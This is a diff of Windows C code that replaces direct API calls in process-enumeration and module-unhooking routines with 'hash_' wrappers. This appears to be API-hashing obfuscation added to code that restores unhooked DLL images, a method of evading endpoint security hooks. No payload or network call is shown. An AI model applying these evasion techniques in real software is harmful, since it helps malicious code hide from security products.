@@ -130,11 +130,11 @@ BOOLEAN NTAPI EnumProcesses_(
   OPTIONAL PVOID Argument
 ) {
   ULONG Length = 0;
-  NTSTATUS Status = NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &Length);
+  NTSTATUS Status = hash_NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &Length);
   if (Status != ((NTSTATUS)0xC0000004L)) return FALSE;
   PWRK_SYSTEM_PROCESS_INFORMATION Info = (PWRK_SYSTEM_PROCESS_INFORMATION)Alloc(NULL, Length, PAGE_READWRITE);
   if (!Info) return FALSE;
-  Status = NtQuerySystemInformation(SystemProcessInformation, Info, Length, &Length);
+  Status = hash_NtQuerySystemInformation(SystemProcessInformation, Info, Length, &Length);
   if (!NT_SUCCESS(Status)) {
     Free(Info);
     return FALSE;
@@ -298,7 +298,7 @@ DWORD UnhookModule(const HMODULE hModule)
     return ERR_CREATE_FILE_FAILED;
   }
   // Create a mapping object for the module.
-  HANDLE hFileMapping = CreateFileMapping(
+  HANDLE hFileMapping = hash_CreateFileMappingW(
                           hFile,						// Handle to file.
                           NULL,						    // Mapping attributes.
                           PAGE_READONLY | SEC_IMAGE,	// Page protection.
@@ -367,10 +367,10 @@ DWORD Unhook(const char *lpLibName) {
   DWORD hMod = UnhookModule(hModule);
   // free lib
   if (hMod) {
-    FreeModule(hModule);
+    hash_FreeLibrary(hModule);
   }
   else {
-    FreeModule(hModule);
+    hash_FreeLibrary(hModule);
   }
   return hMod;
 }
